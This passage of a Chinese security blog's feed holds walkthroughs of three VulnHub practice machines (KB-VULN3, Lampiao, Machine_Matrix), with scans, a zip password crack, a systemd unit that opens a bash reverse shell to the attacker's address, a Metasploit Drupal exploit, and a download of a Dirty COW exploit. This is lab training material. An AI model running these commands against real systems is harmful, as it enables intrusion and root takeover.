(RSA)</span><br><span class="line">|   256 61:06:df:25:d5:e1:e3:47:fe:13:94:fd:74:0c:85:00 (ECDSA)</span><br><span class="line">|_  256 50:89:b6:b4:3a:0b:6e:63:12:10:40:e2:c4:f9:35:33 (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:93:80:7F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: Host: KB-SERVER; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: KB-SERVER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: kb-server</span><br><span class="line">|   NetBIOS computer name: KB-SERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: kb-server</span><br><span class="line">|_  System time: 2021-05-07T12:58:12+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-05-07T12:58:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./KB-VULN3/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.158/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/KB-VULN3]</span><br><span class="line">└─# gobuster dir -u http://192.168.4.158/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php                                                                                     127 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.4.158/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/07 08:58:29 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 8768]</span><br><span class="line">/server-status        (Status: 403) [Size: 278] </span><br><span class="line">                                                </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/07 09:04:26 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>



<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./KB-VULN3/2.png" alt></p>
<h3 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbclient -L 192.168.4.158</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN3/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.4.158/Files</span><br></pre></td></tr></table></figure>

<ul>
<li>发现敏感文件</li>
</ul>
<p><img data-src="./KB-VULN3/4.png" alt></p>
<h3 id="破解压缩包"><a href="#破解压缩包" class="headerlink" title="破解压缩包"></a>破解压缩包</h3><p><img data-src="./KB-VULN3/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt website.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/KB-VULN3]</span><br><span class="line">└─# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt website.zip                                1 ⨯</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == porchman</span><br></pre></td></tr></table></figure>

<ul>
<li>获得敏感信息</li>
</ul>
<p><img data-src="./KB-VULN3/6.png" alt></p>
<p>账户密码 <code>admin / jesse</code></p>
<h3 id="登入CMS"><a href="#登入CMS" class="headerlink" title="登入CMS"></a>登入CMS</h3><p><img data-src="./KB-VULN3/7.png" alt></p>
<ul>
<li>进一步目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.158/sitemagic/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br></pre></td></tr></table></figure>

<p>貌似没必要，网站备份都拿到了<code>GG</code></p>
<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./KB-VULN3/8.png" alt></p>
<p><img data-src="./KB-VULN3/9.png" alt></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><img data-src="./KB-VULN3/10.png" alt></p>
<p><img data-src="./KB-VULN3/11.png" alt></p>
<p><img data-src="./KB-VULN3/12.png" alt></p>
<ul>
<li>拿到用户信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">heisenberg:x:1000:1000:VULN-SERVER:/home/heisenberg:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img data-src="./KB-VULN3/13.png" alt></p>
<p><a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/systemctl/</a></p>
<p><img data-src="./KB-VULN3/14.png" alt></p>
<ul>
<li>创建自定义服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> m4.service</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=m4.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.4.163/4444 0&gt;&amp;1"</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/bin/systemctl link /dev/shm/m4.service</span><br><span class="line">/bin/systemctl start m4.service</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN3/15.png" alt></p>
<p><img data-src="./KB-VULN3/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>KB-VULN</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>KB-VULN</tag>
      </tags>
  </entry>
  <entry>
    <title>Lampiao</title>
    <url>/2021/03/07/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Lampiao/</url>
    <content><![CDATA[<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Lampiao</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    30:45:96:e4:ed:56       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.43.33   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.208  08:00:27:31:81:db       PCS Systemtechnik GmbH                                                                                                                         </span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.208</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.208</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/Desktop# nmap -sV -A -p 1-65535 192.168.43.208                                                                                                                                             </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-07 00:03 EST                                                                                                                                                   </span><br><span class="line">Nmap scan report for lampiao (192.168.43.208)</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)</span><br><span class="line">|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)</span><br><span class="line">|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)</span><br><span class="line">|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)</span><br><span class="line">80/tcp   open  http?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     _____ _ _ </span><br><span class="line">|     |_|/ ___ ___ __ _ ___ _ _ </span><br><span class="line">|     \x20| __/ (_| __ \x20|_| |_ </span><br><span class="line">|     ___/ __| |___/ ___|__,_|___/__, ( ) </span><br><span class="line">|     |___/ </span><br><span class="line">|     ______ _ _ _ </span><br><span class="line">|     ___(_) | | | |</span><br><span class="line">|     \x20/ _` | / _ / _` | | | |/ _` | |</span><br><span class="line">|_    __,_|__,_|_| |_|</span><br><span class="line">1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Lampi\xC3\xA3o</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.80%I=7%D=3/7%Time=60445E94%P=x86_64-pc-linux-gnu%r(NULL,</span><br><span class="line">SF:10F8,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\x2</span><br><span class="line">SF:0\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x20_</span><br><span class="line">SF:_\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\</span><br><span class="line">SF:x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`\x</span><br><span class="line">SF:20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_\|</span><br><span class="line">SF:\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\x2</span><br><span class="line">SF:0\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\|\</span><br><span class="line">SF:x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n\|</span><br><span class="line">SF:\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20__</span><br><span class="line">SF:\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20\x</span><br><span class="line">SF:20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x20_</span><br><span class="line">SF:`\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\x2</span><br><span class="line">SF:0/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x20</span><br><span class="line">SF:\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\|\</span><br><span class="line">SF:x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\|_</span><br><span class="line">SF:\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\__,</span><br><span class="line">SF:_\|_\|\x20\|_\|");</span><br><span class="line">MAC Address: 08:00:27:31:81:DB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms lampiao (192.168.43.208)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.36 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Lampiao/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./Lampiao/2.png" alt></p>
<ul>
<li>查看<code>1898</code>端口</li>
</ul>
<p><img data-src="./Lampiao/3.png" alt></p>
<p>发现框架为 <code>drupal</code></p>
<h3 id="MSF大法"><a href="#MSF大法" class="headerlink" title="MSF大法"></a>MSF大法</h3><p><img data-src="./Lampiao/4.png" alt></p>
<p><img data-src="./Lampiao/5.png" alt></p>
<ul>
<li>交互<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<ul>
<li>发现敏感信息(<code>/var/www/html/sites/default</code>)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">databases = array (</span></span><br><span class="line">  'default' =&gt; </span><br><span class="line">  array (</span><br><span class="line">    'default' =&gt; </span><br><span class="line">    array (</span><br><span class="line">      'database' =&gt; 'drupal',</span><br><span class="line">      'username' =&gt; 'drupaluser',</span><br><span class="line">      'password' =&gt; 'Virgulino',</span><br><span class="line">      'host' =&gt; 'localhost',</span><br><span class="line">      'port' =&gt; '',</span><br><span class="line">      'driver' =&gt; 'mysql',</span><br><span class="line">      'prefix' =&gt; '',</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@lampiao:/var/www/html/sites/default$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br></pre></td></tr></table></figure>

<ul>
<li>脏牛提权<code>CVE-2016-5195</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.43.86:8000&#x2F;dcow.cpp</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.43.86:8000&#x2F;makefile</span><br></pre></td></tr></table></figure>

<p><img data-src="./Lampiao/6.png" alt></p>
<p><img data-src="./Lampiao/7.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>other</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_Matrix</title>
    <url>/2021/02/19/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Machine_Matrix/</url>
    <content><![CDATA[<h1 id="Machine-Matrix"><a href="#Machine-Matrix" class="headerlink" title="Machine_Matrix"></a>Machine_Matrix</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Machine_Matrix</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.1.100</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d0:76:e7:45:6f:f9       TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.1.101   00:50:56:35:06:9a       VMware, Inc.</span><br><span class="line">192.168.1.105   38:d5:47:11:43:e9       ASUSTek COMPUTER INC.</span><br><span class="line">192.168.1.107   00:0c:29:dc:4a:44       VMware, Inc.</span><br><span class="line">192.168.1.103   a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line"></span><br><span class="line">17 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.1.107</li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.107</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.1.107</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-18 21:34 EST</span><br><span class="line">Nmap scan report for 192.168.1.107</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)</span><br><span class="line">|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)</span><br><span class="line">|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)</span><br><span class="line">80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</span><br><span class="line">|_http-title: Welcome in Matrix</span><br><span class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-title: Welcome in Matrix</span><br><span class="line">MAC Address: 00:0C:29:DC:4A:44 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.64 ms 192.168.1.107</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Machine_Matrix/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./Machine_Matrix/2.png" alt></p>
<ul>
<li><p>80 端口并未发现什么</p>
</li>
<li><p>查看  31337 端口</p>
</li>
</ul>
<p><img data-src="./Machine_Matrix/3.png" alt></p>
<ul>
<li>右键网页源代码 发现</li>
</ul>
<p><img data-src="./Machine_Matrix/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</span><br></pre></td></tr></table></figure>

<ul>
<li><code>base64</code>解码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " &gt; Cypher.matrix</span><br></pre></td></tr></table></figure>

<ul>
<li>提示 <code>Cypher.matrix</code></li>
</ul>
<p><img data-src="./Machine_Matrix/5.png" alt></p>
